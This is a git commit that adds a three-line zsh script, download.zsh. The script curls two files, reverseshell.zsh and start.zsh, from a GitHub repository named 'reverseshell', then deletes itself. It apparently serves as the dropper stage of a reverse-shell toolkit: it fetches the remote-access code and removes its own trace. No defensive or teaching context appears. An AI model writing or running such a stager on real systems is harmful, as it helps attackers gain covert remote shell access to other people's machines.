3d1ae2206cb75e71f48e16d6fd65fe0d1be8679a
mmilunicmobile <62996888+mmilunicmobile@users.noreply.github.com>
2022-02-10 22:47:08 -0500

    Add files via upload

---
+++ download.zsh
@@ -0,0 +1,3 @@
+curl -o reverseshell.zsh https://github.com/mmilunicmobile/reverseshell/blob/main/reverseshell.zsh
+curl -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
+rm download.zsh
